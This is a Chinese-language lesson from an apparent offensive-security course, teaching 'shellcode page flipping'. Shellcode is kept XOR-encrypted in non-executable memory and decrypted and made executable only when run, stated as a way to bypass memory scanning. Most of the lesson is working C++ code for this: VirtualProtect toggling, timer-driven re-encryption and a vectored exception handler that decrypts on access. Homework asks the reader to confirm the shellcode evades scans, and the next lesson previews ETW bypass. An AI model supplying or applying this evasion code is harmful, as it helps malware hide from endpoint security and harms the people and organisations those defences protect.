# 课时33：ShellCode页面反转

## 1. 课程目标

学习ShellCode页面反转技术，通过切换内存权限来绕过内存扫描。

---

## 2. 技术原理

```
执行前:
┌─────────────────────────┐
│ ShellCode (加密状态)    │ PAGE_READWRITE (不可执行)
└─────────────────────────┘
                ↓ 需要执行时
执行时:
┌─────────────────────────┐
│ ShellCode (解密状态)    │ PAGE_EXECUTE_READ (可执行)
└─────────────────────────┘
                ↓ 执行完成后
空闲时:
┌─────────────────────────┐
│ ShellCode (重新加密)    │ PAGE_READWRITE (不可执行)
└─────────────────────────┘
```

---

## 3. 实现代码

### 3.1 基础页面反转

```cpp
#include <windows.h>

typedef struct _SHELLCODE_PAGE {
    LPVOID pMem;
    SIZE_T size;
    BYTE key;
    BOOL bEncrypted;
} SHELLCODE_PAGE;

// 加密内存
void EncryptPage(SHELLCODE_PAGE* pSP) {
    if (pSP->bEncrypted) return;
    
    DWORD oldProtect;
    VirtualProtect(pSP->pMem, pSP->size, PAGE_READWRITE, &oldProtect);
    
    LPBYTE pData = (LPBYTE)pSP->pMem;
    for (SIZE_T i = 0; i < pSP->size; i++) {
        pData[i] ^= pSP->key;
    }
    
    pSP->bEncrypted = TRUE;
}

// 解密并准备执行
void DecryptPage(SHELLCODE_PAGE* pSP) {
    if (!pSP->bEncrypted) return;
    
    LPBYTE pData = (LPBYTE)pSP->pMem;
    for (SIZE_T i = 0; i < pSP->size; i++) {
        pData[i] ^= pSP->key;
    }
    
    DWORD oldProtect;
    VirtualProtect(pSP->pMem, pSP->size, PAGE_EXECUTE_READ, &oldProtect);
    
    pSP->bEncrypted = FALSE;
}

// 执行
void ExecuteShellcode(SHELLCODE_PAGE* pSP) {
    DecryptPage(pSP);
    
    ((void(*)())pSP->pMem)();
    
    EncryptPage(pSP);  // 执行后重新加密
}
```

### 3.2 定时反转

```cpp
#include <windows.h>

SHELLCODE_PAGE g_SP;

// 定时器回调 - 定期加密
VOID CALLBACK TimerCallback(PVOID lpParam, BOOLEAN TimerOrWaitFired) {
    if (!g_SP.bEncrypted) {
        EncryptPage(&g_SP);
    }
}

void SetupPeriodicEncryption() {
    HANDLE hTimer;
    CreateTimerQueueTimer(&hTimer, NULL, TimerCallback, NULL,
                          100, 100, 0);  // 每100ms检查
}
```

---

## 4. 高级技术

### 4.1 需要时解密

```cpp
// 使用VEH处理访问异常
LONG CALLBACK VEHHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        LPVOID pAddr = (LPVOID)pExInfo->ExceptionRecord->ExceptionInformation[1];
        
        // 检查是否是我们的页面
        if (IsOurPage(pAddr)) {
            DecryptPage(&g_SP);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

---

## 5. 课后作业

### 作业1：基础反转（必做）

1. 实现ShellCode页面的加密/解密切换
2. 验证内存扫描时ShellCode是加密状态

### 作业2：自动反转（进阶）

1. 实现空闲时自动加密
2. 访问时自动解密

---

## 6. 下一课预告

下一课我们将学习ETW绕过技术。
